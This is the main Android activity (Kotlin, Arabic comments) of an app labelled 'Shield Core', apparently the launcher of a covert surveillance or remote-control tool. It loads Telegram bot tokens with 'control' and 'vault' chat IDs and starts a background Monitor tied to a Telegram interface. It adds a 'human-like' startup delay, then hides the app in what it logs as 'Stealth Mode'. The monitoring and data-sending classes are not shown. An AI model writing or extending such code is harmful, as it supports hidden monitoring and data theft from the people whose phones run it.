package com.example.app

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.*

/**
 * النشاط الرئيسي للتطبيق – يعمل كواجهة سجل تشخيصي (Diagnostic Console)
 * لإظهار جميع عمليات التهيئة والنجاحات والفشل بدقة، مع إمكانية تسجيل الأخطاء
 * من الفئات الأخرى عبر الدالة الثابتة appendLogStatic.
 *
 * ✅ التعديلات الجديدة:
 * - إضافة معالج استثناءات عام (UncaughtExceptionHandler) لمنع الإغلاق الصامت.
 * - إضافة زر لنسخ السجل التشخيصي بالكامل (btnCopyLog).
 * - إضافة تسجيل تشخيصي لجميع مراحل التهيئة.
 * - ✅ استدعاء ConfigLoader.ensureModelLoaded() لتحميل نموذج AI تلقائياً.
 * - إبقاء التطبيق ظاهراً 10 ثوانٍ للتشخيص قبل الإخفاء الخلفي.
 * - ✅ تحسين معالجة السجلات بحماية من NullPointerException.
 * - ✅ إضافة تنظيف الموارد في onDestroy.
 */
class MainActivity : AppCompatActivity() {
    companion object {
        @Volatile
        private var instance: MainActivity? = null

        /**
         * دالة ثابتة لتسجيل رسائل السجل من أي مكان في التطبيق.
         * يتم استدعاؤها من ConfigLoader و TelegramUi و ForegroundService وغيرها.
         * @param msg الرسالة المراد تسجيلها
         */
        fun appendLogStatic(msg: String) {
            instance?.appendLog(msg) ?: android.util.Log.i("DIAGNOSTIC", msg)
        }
    }

    private lateinit var logTextView: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // ✅ معالج الاستثناءات العام لمنع الإغلاق الصامت
        Thread.setDefaultUncaughtExceptionHandler { _, throwable ->
            val errorMsg = "❌ CRITICAL CRASH: ${throwable.localizedMessage}\n${throwable.stackTraceToString()}"
            appendLog(errorMsg)
            android.util.Log.e("MainActivity", errorMsg)
        }

        try {
            instance = this
            setContentView(R.layout.activity_main)
            logTextView = findViewById(R.id.logTextView)
            val btnCopyLog = findViewById<Button>(R.id.btnCopyLog)

            appendLog("🚀 Shield Core v4.2 Diagnostic Mode Started")
            appendLog("📱 Device: ${Build.MANUFACTURER} ${Build.MODEL}")
            appendLog("📊 Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")

            // ✅ زر نسخ السجل التشخيصي بالكامل
            btnCopyLog.setOnClickListener {
                val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val clip = ClipData.newPlainText("DiagnosticLogs", logTextView.text.toString())
                clipboard.setPrimaryClip(clip)
                Toast.makeText(this, "✅ تم نسخ السجل بنجاح", Toast.LENGTH_SHORT).show()
            }

            appendLog("⚙️ Starting Foreground Service...")
            val serviceIntent = Intent(this, ForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            appendLog("✅ Foreground Service Dispatched Successfully")

            lifecycleScope.launch(Dispatchers.IO) {
                delay(2000) // تأخير بشري بسيط
                initCoreAsync()
            }

        } catch (e: Exception) {
            appendLog("❌ CRITICAL onCreate ERROR: ${e.localizedMessage}")
            e.printStackTrace()
        }
    }

    /**
     * دالة مثيل (Instance) لتسجيل الرسائل في السجل التشخيصي.
     * يتم استدعاؤها داخلياً ومن appendLogStatic.
     * @param msg الرسالة المراد تسجيلها
     */
    fun appendLog(msg: String) {
        val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
        val logEntry = "[$timestamp] $msg\n"
        runOnUiThread {
            try {
                if (::logTextView.isInitialized) {
                    logTextView.append(logEntry)
                    (logTextView.parent as? ScrollView)?.fullScroll(ScrollView.FOCUS_DOWN)
                }
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "Log append error: ${e.message}")
            }
        }
    }

    // ============================================================
    //  التهيئة الأساسية (Core Initialization)
    // ============================================================

    private suspend fun initCoreAsync() {
        appendLog("🚀 Starting Core Initialization...")
        try {
            appendLog("📂 Loading Configuration...")
            val config = ConfigLoader.load(this@MainActivity)
            appendLog("✅ Config loaded: ${config.activeTokens.size} active tokens")
            appendLog("🔑 Control ID: ${config.controlId}, Vault ID: ${config.vaultId}")
            appendLog("🔐 Secret length: ${config.secret.length} chars")

            if (config.activeTokens.isEmpty()) {
                appendLog("⚠️ WARNING: No active tokens! Telegram will NOT work.")
            }

            // ✅ تحميل نموذج AI في الخلفية بعد تحميل الإعدادات
            appendLog("📥 Checking for AI model...")
            ConfigLoader.ensureModelLoaded(this@MainActivity)

            appendLog("🛰️ Initializing Monitor & Telegram UI...")
            val monitor = Monitor.getInstance(this@MainActivity)
            val telegramUi = TelegramUi.create(this@MainActivity, monitor, config)

            monitor.ui = telegramUi
            monitor.ctrl = config.controlId
            monitor.vlt = config.vaultId

            val uiStarted = telegramUi.start()
            appendLog("📡 Telegram UI Start Status: $uiStarted")

            monitor.start()
            appendLog("✅ All Core Systems Operational.")

            // ✅ إبقاء التطبيق ظاهراً 10 ثوانٍ للتشخيص قبل الإخفاء الآمن
            withContext(Dispatchers.Main) {
                delay(10000)
                moveTaskToBack(true)
                appendLog("📱 App moved to background (Stealth Mode)")
            }
        } catch (e: Exception) {
            appendLog("❌ CRITICAL INITIALIZATION FAILURE: ${e.localizedMessage}")
            e.printStackTrace()
        }
    }

    // ============================================================
    //  إدارة دورة الحياة
    // ============================================================

    override fun onDestroy() {
        super.onDestroy()
        // تنظيف الموارد
        try {
            ConfigLoader.clearSensitiveData()
        } catch (_: Exception) {
            // تجاهل
        }
        instance = null
        appendLog("✅ Application shutdown complete")
    }
}
